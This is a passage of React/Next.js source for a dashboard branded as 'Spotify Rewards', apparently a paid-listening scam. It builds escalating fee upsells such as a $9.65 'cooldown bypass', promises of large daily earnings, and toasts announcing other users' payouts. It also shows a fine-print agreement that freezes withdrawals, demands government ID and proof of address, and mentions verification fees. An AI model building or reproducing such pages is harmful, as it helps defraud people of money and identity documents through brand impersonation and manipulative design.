                    action: 'declined',
                  }).catch(() => {});
                  recordFunnelEvent({
                    email: listenerEmail,
                    full_name: listenerName,
                    offer_id: 'downsell_booster2_9_12',
                    offer_name: 'Downsell #2: Booster +2 Músicas/Dia',
                    amount: 9.12,
                    action: 'viewed',
                  }).catch(() => {});
                }}
                className="w-full py-2.5 px-4 rounded-full bg-transparent hover:bg-[#181818] text-gray-400 hover:text-gray-200 font-bold text-xs transition-colors cursor-pointer"
              >
                No thanks, show smaller option
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 4. TASK BOOSTER DOWNSELL MODAL (+2 Songs/day for +$9.12)                   */}
      {/* ========================================================================= */}
      {showTaskBoosterDownsellModal && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-md bg-[#0a0a0a] border border-amber-500/40 rounded-3xl p-6 sm:p-7 shadow-2xl space-y-5 text-white">
            <div className="flex items-center justify-between border-b border-[#222] pb-4">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-full bg-amber-500/20 text-amber-400 flex items-center justify-center border border-amber-500/40">
                  <TrendingUp className="w-4 h-4" />
                </div>
                <div>
                  <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 block">
                    SPECIAL BOOSTER DOWNSELL
                  </span>
                  <h3 className="text-sm font-extrabold text-white">
                    Unlock +2 Extra Tracks Daily
                  </h3>
                </div>
              </div>
              <button
                onClick={() => {
                  setShowTaskBoosterDownsellModal(false);
                  recordFunnelEvent({
                    email: listenerEmail,
                    full_name: listenerName,
                    offer_id: 'downsell_booster2_9_12',
                    offer_name: 'Downsell #2: Booster +2 Músicas/Dia',
                    amount: 9.12,
                    action: 'declined',
                  }).catch(() => {});
                }}
                className="text-gray-400 hover:text-white p-1"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3 text-xs leading-relaxed text-gray-300">
              <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-200 space-y-1">
                <div className="flex items-center justify-between">
                  <span className="font-extrabold text-white">+2 Daily Tracks Pass</span>
                  <span className="text-sm font-black text-amber-400">$9.12 USD</span>
                </div>
                <p className="text-[11px] text-amber-300">
                  Expand your daily limit to 5 tracks per day and earn up to <b>$103.98 USD/day</b>.
                </p>
              </div>
            </div>

            <div className="space-y-2 pt-2">
              <button
                type="button"
                onClick={() => {
                  setShowTaskBoosterDownsellModal(false);
                  router.push('/payment?offer=downsell_booster2_9_12');
                }}
                className="w-full py-3.5 px-4 rounded-full bg-amber-400 hover:bg-amber-300 text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-amber-400/20 flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>ACTIVATE +2 TRACKS BOOSTER ($9.12)</span>
                <ArrowRight className="w-4 h-4 stroke-[3]" />
              </button>

              <button
                type="button"
                onClick={() => {
                  setShowTaskBoosterDownsellModal(false);
                  recordFunnelEvent({
                    email: listenerEmail,
                    full_name: listenerName,
                    offer_id: 'downsell_booster2_9_12',
                    offer_name: 'Downsell #2: Booster +2 Músicas/Dia',
                    amount: 9.12,
                    action: 'declined',
                  }).catch(() => {});
                }}
                className="w-full py-2.5 px-4 rounded-full bg-transparent hover:bg-[#181818] text-gray-400 hover:text-gray-200 font-bold text-xs transition-colors cursor-pointer"
              >
                No thanks, wait 12 hours
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* 5. FAST-FORWARD SKIP COOLDOWN MODAL (Bypass 12h for +$9.65)                 */}
      {/* ========================================================================= */}
      {showSkipCooldownModal && (
        <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-md bg-[#0a0a0a] border border-[#1db954]/50 rounded-3xl p-6 sm:p-7 shadow-2xl space-y-5 text-white">
            <div className="flex items-center justify-between border-b border-[#222] pb-4">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-full bg-[#1db954]/20 text-[#1db954] flex items-center justify-center border border-[#1db954]/40">
                  <Clock className="w-4 h-4" />
                </div>
                <div>
                  <span className="text-[10px] font-black uppercase tracking-wider text-[#1db954] block">
                    INSTANT COOLDOWN BYPASS
                  </span>
                  <h3 className="text-sm font-extrabold text-white">
                    Fast-Forward 12-Hour Timer
                  </h3>
                </div>
              </div>
              <button
                onClick={() => {
                  setShowSkipCooldownModal(false);
                  recordFunnelEvent({
                    email: listenerEmail,
                    full_name: listenerName,
                    offer_id: 'upsell_skip12h_9_65',
                    offer_name: 'Upsell #3: Destravar Timer 12h',
                    amount: 9.65,
                    action: 'declined',
                  }).catch(() => {});
                }}
                className="text-gray-400 hover:text-white p-1"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3 text-xs leading-relaxed text-gray-300">
              <p className="text-sm text-gray-200">
                Don&apos;t wait 12 hours for the next daily reset. Unlock tomorrow&apos;s evaluation queue immediately!
              </p>

              <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-between">
                <span className="text-xs font-bold text-amber-300 flex items-center gap-1.5">
                  <TrendingUp className="w-4 h-4 text-amber-400 shrink-0" />
                  <span>Tomorrow&apos;s Earnings Probability:</span>
                </span>
                <span className="text-sm font-black text-amber-400">
                  ~${getDailyTotalEstimate(currentDay + 1, dailySongLimit).toFixed(2)} USD
                </span>
              </div>

              <div className="p-4 rounded-2xl bg-[#122217] border border-[#1db954]/40 text-[#1db954] space-y-1">
                <div className="flex items-center justify-between">
                  <span className="font-extrabold text-white">Queue Fast-Forward Pass</span>
                  <span className="text-sm font-black text-[#1db954]">+$9.65 USD</span>
                </div>
                <p className="text-[11px] text-gray-300">
                  Instantly resets your daily evaluation counter and grants access to tomorrow&apos;s payout track pool right now.
                </p>
              </div>
            </div>

            <div className="space-y-2 pt-2">
              <button
                type="button"
                onClick={() => {
                  setShowSkipCooldownModal(false);
                  router.push('/payment?offer=upsell_skip12h_9_65');
                }}
                className="w-full py-3.5 px-4 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>BYPASS TIMER &amp; UNLOCK TASKS NOW (+$9.65)</span>
                <ArrowRight className="w-4 h-4 stroke-[3]" />
              </button>

              <button
                type="button"
                onClick={() => {
                  setShowSkipCooldownModal(false);
                  recordFunnelEvent({
                    email: listenerEmail,
                    full_name: listenerName,
                    offer_id: 'upsell_skip12h_9_65',
                    offer_name: 'Upsell #3: Destravar Timer 12h',
                    amount: 9.65,
                    action: 'declined',
                  }).catch(() => {});
                }}
                className="w-full py-2.5 px-4 rounded-full bg-transparent hover:bg-[#181818] text-gray-400 hover:text-gray-200 font-bold text-xs transition-colors cursor-pointer"
              >
                Cancel &amp; Wait
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* FIRST LOGIN AGREEMENT MODAL (Compact modal with long entrelinhas contract) */}
      {/* ========================================================================= */}
      {/* ========================================================================= */}
      {/* FIRST LOGIN AGREEMENT MODAL (Small Square Modal with White Bank Paper BG)  */}
      {/* ========================================================================= */}
      {showAgreementModal && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-3 animate-in fade-in duration-200">
          <div className="w-[330px] sm:w-[360px] max-h-[460px] bg-white text-zinc-900 border border-zinc-300 rounded-2xl shadow-2xl overflow-hidden flex flex-col">
            {/* Modal Header - Compact Dark Header */}
            <div className="px-3.5 py-2.5 bg-[#121212] text-white flex items-center justify-between shrink-0 border-b border-[#282828]">
              <div className="flex items-center gap-2">
                <div className="w-5 h-5 rounded-full bg-[#1db954] text-black flex items-center justify-center font-black">
                  <ShieldCheck className="w-3.5 h-3.5 stroke-[3]" />
                </div>
                <div>
                  <h3 className="text-xs font-black text-white uppercase tracking-tight">
                    Member Guidelines
                  </h3>
                  <span className="text-[9px] text-[#1db954] font-semibold block -mt-0.5">
                    First-Time Compliance Protocol
                  </span>
                </div>
              </div>
              <span className="text-[9px] uppercase font-bold bg-[#1db954] text-black px-1.5 py-0.5 rounded tracking-wide">
                Mandatory
              </span>
            </div>

            {/* Modal Scrollable Contract Body - White Bank Contract Paper with Small Print */}
            <div
              ref={termsScrollRef}
              onScroll={handleScrollTerms}
              className="p-3 bg-[#ffffff] text-zinc-800 overflow-y-auto space-y-2 text-[9.5px] leading-relaxed border-b border-zinc-200 select-text font-sans"
              style={{ maxHeight: '270px' }}
            >
              {/* Official Institutional Preamble */}
              <div className="p-2 rounded-lg bg-zinc-100 border border-zinc-200 text-zinc-700">
                <p className="font-bold text-zinc-900 mb-0.5">
                  SPOTIFY REWARDS NETWORK • MASTER LISTENER AGREEMENT &amp; DISBURSEMENT TERMS
                </p>
                <p className="text-[9px] leading-snug text-zinc-600">
                  This Agreement governs participation in the independent acoustic evaluation pool, telemetry audit network, and royalty distribution program. By accepting, you acknowledge and agree to the comprehensive stipulations, compliance schedules, and verification protocols set forth below.
                </p>
              </div>

              {/* SECTION 1 */}
              <div>
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  1. Independent Program Architecture &amp; Licensing Scope
                </h4>
                <p className="mt-0.5 text-zinc-600">
                  1.1. The Spotify Rewards Independent Listener Program is an evaluation initiative operated in coordination with licensed catalog syndicates, independent music aggregators, and digital streaming telemetric auditors. Participation is voluntary, limited to authorized consumer tiers, and non-assignable.
                </p>
                <p className="mt-1 text-zinc-600">
                  1.2. Program activities are designed to gauge legitimate listener acoustic reception, tempo resonance, and audience retention metrics prior to general catalog distribution. Neither acceptance into the review pool nor completion of preliminary tasks confers permanent employment, joint venture, or agency representation.
                </p>
                <p className="mt-1 text-zinc-600">
                  1.3. Members are designated as independent evaluation contractors subject to compliance with anti-syndication criteria, federal data integrity regulations, and catalog intellectual property safeguards.
                </p>
              </div>

              {/* SECTION 2 */}
              <div>
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  2. Audio Telemetry, Stream Integrity &amp; Bot Prevention
                </h4>
                <p className="mt-0.5 text-zinc-600">
                  2.1. Every evaluation session requires full acoustic playback of the designated pre-release or catalog excerpt (minimum threshold of eight seconds continuous playback) prior to the activation of qualitative response inputs.
                </p>
                <p className="mt-1 text-zinc-600">
                  2.2. The network deploys real-time browser telemetry, pointer movement velocity analysis, focus state monitors, and algorithmic entropy detectors to confirm human listening behavior. Any session characterized by automated macro manipulation, headless browser instances, synthetic API emulation, or rapid-click automation will result in immediate data discard and permanent tier blacklisting.
                </p>
                <p className="mt-1 text-zinc-600">
                  2.3. Evaluations must reflect honest, subjective appraisals. Systematic identical submissions across disparate tracks constitute non-compliance with the data fidelity charter and will trigger an automatic quality audit flag.
                </p>
              </div>

              {/* SECTION 3 */}
              <div>
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  3. Compensation Accrual &amp; Balance Verification
                </h4>
                <p className="mt-0.5 text-zinc-600">
                  3.1. Royalty credits, initial onboarding bonuses, and promotional evaluation compensation (including the $114.93 USD initial qualification allocation) are held in an accrued escrow status pending final audit reconciliation and identity authentication.
                </p>
                <p className="mt-1 text-zinc-600">
                  3.2. Accrued balances do not constitute demand deposit banking balances until all compliance thresholds, waiting periods, KYC documentation, and banking validation clearance requirements have been formally fulfilled by the clearing division.
                </p>
              </div>

              {/* SECTION 4 - CRITICAL ENTRELINHAS: 15-DAY AUDIT & WITHDRAWAL QUARANTINE */}
              <div className="p-2 rounded-lg bg-amber-50 border border-amber-300 text-amber-950 space-y-1">
                <h4 className="font-black text-amber-900 text-[10px] uppercase tracking-wide flex items-center gap-1">
                  <span>4. Mandatory 15-Day Quality Compliance Audit &amp; Holding Period</span>
                </h4>
                <p className="text-[9px] leading-snug">
                  <b>4.1. Initial 15-Day Holding Period:</b> In strict accordance with inter-bank clearinghouse guidelines, automated stream audit clearing standards, and federal financial anti-fraud protocols, all newly enrolled accounts are subject to an initial mandatory <b>fifteen (15) calendar day compliance and quality holding window</b> commencing from the official timestamp of account activation.
                </p>
                <p className="text-[9px] leading-snug">
                  <b>4.2. Telemetry and Stream Reconciliation:</b> During this initial 15-day holding interval, audio playback logs and telemetry records undergo automated reconciliation against partner label clearing ledgers to verify stream validity, prevent duplicate bot payouts, and ensure legitimate audience engagement.
                </p>
                <p className="text-[9px] leading-snug">
                  <b>4.3. Disbursement Freeze During Audit:</b> No withdrawal disbursements, wire transfers, ACH payouts, or third-party digital wallet transmissions shall be authorized or executed prior to the complete expiration of this primary 15-day compliance cycle. Any disbursement requests submitted within this initial window will remain queued in audit review status.
                </p>
              </div>

              {/* SECTION 5 - BI-WEEKLY DISBURSEMENT SCHEDULE */}
              <div>
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  5. Payout Cadence &amp; Bi-Weekly Settlement Cycles
                </h4>
                <p className="mt-0.5 text-zinc-600">
                  5.1. Subsequent to the successful completion and clearance of the initial 15-day audit holding period, all approved listener earnings and accumulated royalty balances are settled and disbursed on a recurring <b>bi-weekly (every 15 calendar days)</b> automated processing cadence.
                </p>
                <p className="mt-1 text-zinc-600">
                  5.2. Disbursements are transmitted in batched processing runs directly to the verified financial coordinates designated in the member&apos;s account profile. Processing cut-off windows occur at 11:59 PM EST on the concluding business day of each 15-day cycle.
                </p>
              </div>

              {/* SECTION 6 - CRITICAL ENTRELINHAS: MANDATORY KYC IDENTITY & PROOF OF ADDRESS */}
              <div className="p-2 rounded-lg bg-amber-50 border border-amber-300 text-amber-950 space-y-1">
                <h4 className="font-black text-amber-900 text-[10px] uppercase tracking-wide">
                  6. Mandatory KYC Identity Verification &amp; Proof of Residence
                </h4>
                <p className="text-[9px] leading-snug">
                  <b>6.1. Know-Your-Customer (KYC) Requirements:</b> Prior to the authorization and release of any outward fund disbursement exceeding $100.00 USD, or upon the conclusion of the initial 15-day cycle, members must satisfy formal federal and state KYC identity verification protocols.
                </p>
                <p className="text-[9px] leading-snug">
                  <b>6.2. Document Submission Criteria:</b> To obtain withdrawal clearance, members are required to upload: (a) a legible copy of a valid government-issued photographic identification document (such as a valid State Driver&apos;s License, State Identification Card, or US Passport); and (b) an official, unaltered proof of residential address (such as a residential utility invoice, lease agreement, municipal tax bill, or bank statement issued within the preceding 90 days).
                </p>
                <p className="text-[9px] leading-snug">
                  <b>6.3. Exact Name Matching:</b> The full legal name and billing address appearing on the submitted KYC documentation must correspond precisely with the registered account ownership information and the receiving bank account or digital wallet details. Any discrepancy will result in payout suspension pending manual compliance review.
                </p>
              </div>

              {/* SECTION 7 - CRITICAL ENTRELINHAS: BANKING RECONCILIATION & VERIFICATION FEES */}
              <div className="p-2 rounded-lg bg-zinc-100 border border-zinc-200 text-zinc-800 space-y-1">
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  7. Banking Gateway Reconciliation &amp; Verification Fees
                </h4>
                <p className="text-[9px] leading-snug text-zinc-600">
                  7.1. All outbound transfers, ACH direct deposits, wire releases, and third-party wallet remittances are subject to third-party banking gateway processing assessments, inter-bank clearance costs, identity recognition checks, and automated routing network reconciliation charges.
                </p>
                <p className="text-[9px] leading-snug text-zinc-600">
                  7.2. Applicable clearance and verification assessments imposed by clearing financial intermediaries or the receiving depository institution will be reconciled and accounted for at the time of transfer settlement. Members are solely responsible for ensuring the accuracy and operational validity of their provided routing and transit coordinates.
                </p>
              </div>

              {/* SECTION 8 */}
              <div>
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  8. Tax Compliance &amp; Reporting Obligations
                </h4>
                <p className="mt-0.5 text-zinc-600">
                  8.1. Members acknowledge responsibility for any applicable federal, state, or municipal tax liabilities arising from royalty compensation. When aggregate annual earnings reach or exceed regulatory thresholds (e.g. $600.00 USD), the network will request submission of standard IRS Form W-9 or applicable international documentation prior to continuing disbursements.
                </p>
              </div>

              {/* SECTION 9 */}
              <div>
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  9. Account Deduplication &amp; Geolocation Fidelity
                </h4>
                <p className="mt-0.5 text-zinc-600">
                  9.1. Each individual listener is restricted to exactly one (1) registered member account. Registration of multiple accounts utilizing the same IP subnet, shared payment coordinates, proxy services, or synthetic identities constitutes a material violation of this agreement.
                </p>
                <p className="mt-1 text-zinc-600">
                  9.2. Detection of fraudulent multi-accounting or identity falsification results in immediate account forfeiture, escrow cancellation, and permanent network de-authorization.
                </p>
              </div>

              {/* SECTION 10 */}
              <div>
                <h4 className="font-black text-zinc-900 text-[10px] uppercase tracking-wide">
                  10. Governing Jurisdiction &amp; Severability
                </h4>
                <p className="mt-0.5 text-zinc-600">
                  10.1. This agreement shall be construed and governed in accordance with commercial arbitration standards and applicable federal statutes. If any clause herein is deemed unenforceable, the remaining provisions shall continue in full force and effect.
                </p>
              </div>
            </div>

            {/* Modal Footer - Compact with Checkbox & Acceptance Button */}
            <div className="p-3 bg-zinc-50 border-t border-zinc-200 space-y-2 shrink-0">
              <label className="flex items-start gap-2 cursor-pointer text-[10px] text-zinc-700 select-none">
                <input
                  type="checkbox"
                  checked={agreementChecked}
                  onChange={(e) => setAgreementChecked(e.target.checked)}
                  className="mt-0.5 w-3.5 h-3.5 rounded accent-[#1db954] cursor-pointer shrink-0"
                />
                <span className="leading-tight">
                  I have read and agree to the 15-day compliance review, bi-weekly payouts, mandatory KYC identity &amp; address verification, and disbursement terms.
                </span>
              </label>

              <button
                type="button"
                disabled={!agreementChecked}
                onClick={handleAcceptTerms}
                className={`w-full py-2.5 px-3 rounded-full font-black text-xs uppercase tracking-wider flex items-center justify-center gap-1.5 transition-all ${
                  agreementChecked
                    ? 'bg-[#1db954] text-black hover:bg-[#1ed760] shadow-md shadow-[#1db954]/25 cursor-pointer'
                    : 'bg-zinc-200 text-zinc-400 cursor-not-allowed border border-zinc-300'
                }`}
              >
                <span>Accept Terms &amp; Continue</span>
                <ArrowRight className="w-3.5 h-3.5 stroke-[3]" />
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* POST-GUIDELINES PASSWORD CREATION MODAL                                   */}
      {/* ========================================================================= */}
      {showCreatePasswordModal && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in duration-200">
          <div className="w-full max-w-md bg-[#121212] border border-[#1db954]/40 rounded-3xl p-6 sm:p-7 shadow-2xl space-y-5 text-white">
            <div className="flex items-center gap-3 border-b border-[#242424] pb-4">
              <div className="w-10 h-10 rounded-2xl bg-[#1db954]/15 text-[#1db954] border border-[#1db954]/30 flex items-center justify-center shrink-0">
                <Lock className="w-5 h-5" />
              </div>
              <div>
                <span className="text-[10px] font-black uppercase tracking-wider text-[#1db954] block">
                  Step 2 of 2 • Account Security
                </span>
                <h3 className="text-base sm:text-lg font-black text-white">
                  Create Your Login Password
                </h3>
              </div>
            </div>

            <p className="text-xs text-gray-300 leading-relaxed">
              Guidelines accepted! Set a password below so you can log back into your dashboard anytime to evaluate daily tracks and withdraw your royalties.
            </p>

            <form onSubmit={handleSaveFirstPassword} className="space-y-4">
              <div>
                <label className="block text-[11px] font-bold text-gray-400 uppercase tracking-wider mb-1.5">
                  Registered Account Email
                </label>
                <div className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#282828] text-gray-300 text-xs font-mono truncate">
                  {listenerEmail || 'listener@spotifyrewards.com'}
                </div>
              </div>

              <div>
                <label className="block text-[11px] font-bold text-gray-300 uppercase tracking-wider mb-1.5">
                  Create Your Password
                </label>
                <div className="relative">
                  <input
                    type={showPasswordText ? 'text' : 'password'}
                    required
                    minLength={4}
                    value={newAccountPassword}
                    onChange={(e) => setNewAccountPassword(e.target.value)}
                    placeholder="Enter at least 4 characters..."
                    className="w-full px-4 py-3.5 rounded-xl bg-[#181818] border border-[#2e2e2e] focus:border-[#1db954] text-white text-sm focus:outline-none pr-11"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPasswordText(!showPasswordText)}
                    className="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white cursor-pointer"
                  >
                    {showPasswordText ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              {passwordError && (
                <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/30 text-xs text-red-400 font-semibold">
                  {passwordError}
                </div>
              )}

              <button
                type="submit"
                disabled={isSavingPassword}
                className="w-full py-3.5 px-5 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer"
              >
                <span>{isSavingPassword ? 'SAVING PASSWORD...' : 'SAVE PASSWORD & UNLOCK DASHBOARD'}</span>
                <ArrowRight className="w-4 h-4 stroke-[3]" />
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Hidden Audio element for dynamic track playback */}
      <audio
        ref={audioRef}
        src={currentTrack.audio}
        onTimeUpdate={handleTimeUpdate}
        onEnded={handleAudioEnded}
        preload="auto"
      />

      {/* ========================================================================= */}
      {/* FLOATING LIVE US LISTENER NOTIFICATION TOAST (Centered Single-Line Pill)  */}
      {/* ========================================================================= */}
      <div
        className={`fixed top-[72px] sm:top-20 left-1/2 -translate-x-1/2 z-50 w-auto max-w-[92vw] sm:max-w-md bg-[#0c1a11]/95 backdrop-blur-md border border-[#1db954] px-4 py-2 rounded-full shadow-2xl shadow-black transition-all duration-500 ease-out transform ${
          isToastVisible && activeToastListener
            ? 'translate-y-0 opacity-100 scale-100'
            : '-translate-y-3 opacity-0 scale-95 pointer-events-none'
        }`}
      >
        {activeToastListener && (
          <div className="flex items-center gap-2 text-xs text-gray-200 font-medium whitespace-nowrap">
            <span className="relative flex h-2 w-2 shrink-0">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#1db954] opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-[#1db954]"></span>
            </span>
            <span className="font-extrabold text-white">{activeToastListener.name}</span>
            <span className="text-gray-300">received</span>
            <span className="font-black text-[#1db954] bg-[#1db954]/15 px-2.5 py-0.5 rounded-full border border-[#1db954]/30">
              +${activeToastListener.amount.toFixed(2)} USD
            </span>
          </div>
        )}
      </div>

      {/* ========================================================================= */}
      {/* TOP HEADER (Fixed Top Bar with Always Visible Balance & Release Date)     */}
      {/* ========================================================================= */}
      <header className="fixed top-0 left-0 right-0 z-40 bg-[#121212] border-b border-[#282828] px-3 sm:px-8 py-3 shadow-lg">
        <div className="max-w-6xl mx-auto flex items-center justify-between gap-2">
          {/* Logo & Brand */}
          <Link href="/spotify/dashboard" className="flex items-center gap-2 shrink-0">
            <div className="relative w-8 h-8 rounded-full overflow-hidden bg-black flex items-center justify-center">
              <Image
                src="/spotify-logo.webp"
                alt="Spotify Logo"
                width={32}
                height={32}
                priority
                referrerPolicy="no-referrer"
              />
            </div>
            <div className="flex items-center gap-1">
              <span className="text-white font-black text-base sm:text-lg tracking-tight">Spotify</span>
              <span className="bg-[#1db954] text-black text-[9px] sm:text-[10px] font-black uppercase px-1.5 py-0.5 rounded-full tracking-wider">
                Rewards
              </span>
            </div>
          </Link>

          {/* ALWAYS VISIBLE FIXED BALANCE & RELEASE DATE PILL */}
          <div className="flex items-center gap-2.5 sm:gap-4 bg-[#181818] border border-[#282828] px-3.5 py-1.5 rounded-2xl shadow-inner">
            <div className="text-right">
              <div className="text-[9px] sm:text-[10px] text-gray-400 font-extrabold uppercase tracking-wider leading-none">
                Total Balance
              </div>
              <div className="text-sm sm:text-base font-black text-[#1db954] leading-tight">
                ${accountBalance.toFixed(2)} <span className="text-[10px] text-gray-400 font-normal">USD</span>
              </div>
            </div>
            <div className="h-6 w-px bg-[#2a2a2a]" />
            <div className="text-left">
              <div className="text-[9px] sm:text-[10px] text-gray-400 font-extrabold uppercase tracking-wider leading-none flex items-center gap-1">
                <Clock className="w-3 h-3 text-amber-400 shrink-0" />
                <span>Next Release</span>
              </div>
              <div className="text-xs font-bold text-white leading-tight">
                {releaseDateFormatted || 'Nov 25, 2026'}
              </div>
            </div>
          </div>

          {/* Right Header Navigation & Profile */}
          <div className="flex items-center gap-2 shrink-0">
            <button
              onClick={() => router.push('/spotify/dashboard/profile?tab=profile')}
              className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-[#181818] hover:bg-[#242424] border border-[#282828] transition-all cursor-pointer group"
            >
              <div className="w-7 h-7 rounded-full bg-[#1db954] text-black flex items-center justify-center text-xs font-black">
                <User className="w-4 h-4 stroke-[2.5]" />
              </div>
              <div className="text-left hidden sm:block">
                <span className="block text-xs font-bold text-white leading-tight truncate max-w-[110px] group-hover:text-[#1db954]">
                  {listenerName}
                </span>
                <span className="block text-[9px] text-[#1db954] font-medium">{accountTier}</span>
              </div>
            </button>

            <button
              onClick={handleLogout}
              title="Logout"
              className="p-2 rounded-full bg-[#1e1e1e] hover:bg-[#282828] text-gray-400 hover:text-white transition-colors"
            >
              <LogOut className="w-4 h-4" />
            </button>
          </div>
        </div>
      </header>

      {/* ========================================================================= */}
      {/* MAIN DASHBOARD CONTENT                                                    */}
      {/* ========================================================================= */}
      <main className="max-w-6xl mx-auto px-4 sm:px-8 pt-20 sm:pt-24 pb-12 space-y-6">
        {upgradedBannerMessage && (
          <div className="p-4 sm:p-5 rounded-2xl bg-[#0e2416] border border-[#1db954] flex items-center justify-between gap-4 shadow-xl shadow-[#1db954]/15 animate-in fade-in duration-300">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-full bg-[#1db954] text-black flex items-center justify-center shrink-0">
                <CheckCircle2 className="w-5 h-5 stroke-[2.5]" />
              </div>
              <div>
                <span className="text-[10px] font-black uppercase tracking-wider text-[#1db954] block">
                  UPGRADE UNLOCKED &amp; ACTIVE
                </span>
                <p className="text-xs sm:text-sm font-bold text-white">
                  {upgradedBannerMessage}
                </p>
              </div>
            </div>
            <button
              type="button"
              onClick={() => setUpgradedBannerMessage(null)}
              className="text-gray-400 hover:text-white p-1.5 cursor-pointer"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        )}

        {/* Welcome Hero Banner */}
        <div className="relative overflow-hidden rounded-3xl bg-gradient-to-r from-[#0d2215] via-[#121f17] to-[#181818] border border-[#1db954]/30 p-6 sm:p-8">
          <div className="absolute top-0 right-0 w-80 h-80 bg-[#1db954]/15 rounded-full blur-3xl pointer-events-none -z-0" />

          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
            <div>
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#1db954]/10 border border-[#1db954]/30 text-[11px] font-bold text-[#1db954] uppercase tracking-wider mb-2">
                <Sparkles className="w-3.5 h-3.5" />
                Active Evaluation Session
              </div>
              <h1 className="text-2xl sm:text-3xl md:text-4xl font-black text-white tracking-tight">
                Welcome back, {listenerName}!
              </h1>
              <p className="text-xs sm:text-sm text-gray-300 mt-1 max-w-xl leading-relaxed">
                Your account is in good standing. Listen to today&apos;s audio previews and submit your feedback to claim your daily streaming royalties.
              </p>

              {/* Quick Profile & Withdrawals Button */}
              <div className="mt-4 flex flex-wrap gap-2">
                <button
                  onClick={() => router.push('/spotify/dashboard/profile?tab=request_withdrawal')}
                  className="px-5 py-2.5 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-extrabold text-xs uppercase tracking-wider transition-all flex items-center gap-1.5 shadow-md shadow-[#1db954]/20 cursor-pointer"
                >
                  <DollarSign className="w-3.5 h-3.5 stroke-[2.5]" />
                  <span>Withdraw Funds</span>
                </button>
              </div>
            </div>

            {/* Quick Release Date Card */}
            <div className="bg-black/60 backdrop-blur-sm border border-[#282828] p-4 sm:p-5 rounded-2xl shrink-0 min-w-[200px]">
              <span className="text-[11px] text-gray-400 font-bold uppercase tracking-wider block">
                Scheduled Payout Release
              </span>
              <div className="text-xl sm:text-2xl font-black text-[#1db954] mt-0.5">
                {releaseDateFormatted || 'Nov 25, 2026'}
              </div>
              <div className="flex items-center gap-1.5 text-[11px] text-gray-400 mt-1">
                <Clock className="w-3.5 h-3.5 text-amber-400" />
                <span>{isVip7Day ? '7-day VIP cycle' : 'Standard payout cycle'}</span>
              </div>
            </div>
          </div>
        </div>

        {/* ========================================================================= */}
        {/* 2 STATS CARDS GRID (Release Date + Today's Daily Tasks)                   */}
        {/* ========================================================================= */}
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          {/* Card 1: Payout Cycle */}
          <div className="bg-[#181818] p-5 rounded-2xl border border-[#282828]">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">
                Release Date
              </span>
              <div className="w-8 h-8 rounded-xl bg-amber-500/10 text-amber-400 flex items-center justify-center">
                <Calendar className="w-4 h-4" />
              </div>
            </div>
            <div className="text-xl font-black text-white">{releaseDateFormatted || 'Nov 25, 2026'}</div>
            <p className="text-xs text-gray-400 mt-1 leading-snug">
              {isVip7Day
                ? 'VIP Gold 7-day priority payout schedule active.'
                : 'Standard scheduled disbursement date for your account.'}
            </p>
            <div className="mt-3 w-full bg-[#282828] h-1.5 rounded-full overflow-hidden">
              <div className="bg-[#1db954] h-full w-[25%]" />
            </div>
          </div>

          {/* Card 2: Today's Evaluations */}
          <div className="bg-[#181818] p-5 rounded-2xl border border-[#282828]">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">
                Day {currentDay} • Daily Tasks
              </span>
